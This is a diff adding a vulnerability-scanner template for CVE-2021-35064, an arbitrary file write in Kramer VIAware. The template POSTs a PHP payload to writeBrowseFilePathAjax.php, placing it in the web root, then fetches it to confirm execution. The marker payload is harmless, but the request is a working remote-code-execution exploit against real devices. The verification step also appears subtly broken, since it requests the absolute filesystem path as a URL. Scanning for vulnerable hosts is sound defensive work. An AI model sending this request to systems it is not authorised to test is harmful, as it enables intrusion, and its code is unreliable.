@@ -1,0 +1,49 @@
+id: viaware-file-upload-cve-2021-35064
+
+info:
+  name: VIAware writeBrowseFilePathAjax File Upload (CVE-2021-35064)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A code issue vulnerability exists in Kramer Electronics VIAware that allows remote attackers to execute arbitrary code because ajaxPages/writeBrowseFilePathAjax.php accepts arbitrary executable pathnames.
+  reference:
+    - https://write-up.github.io/kramerav/
+  classification:
+    cve-id: CVE-2021-35064
+    cvss-score: 9.8
+
+variables:
+  test_file: "/var/www/html/test1234.php"
+  payload: "<?php echo md5(1433); unlink(__FILE__); ?>"
+  md5_hash: "b069b3415151fa7217e870017374de7c"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/ajaxPages/writeBrowseFilePathAjax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      X-Requested-With: XMLHttpRequest
+    body: "radioBtnVal={{payload | urlencode}}&associateFileName={{test_file | urlencode}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}{{test_file}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5_hash}}"
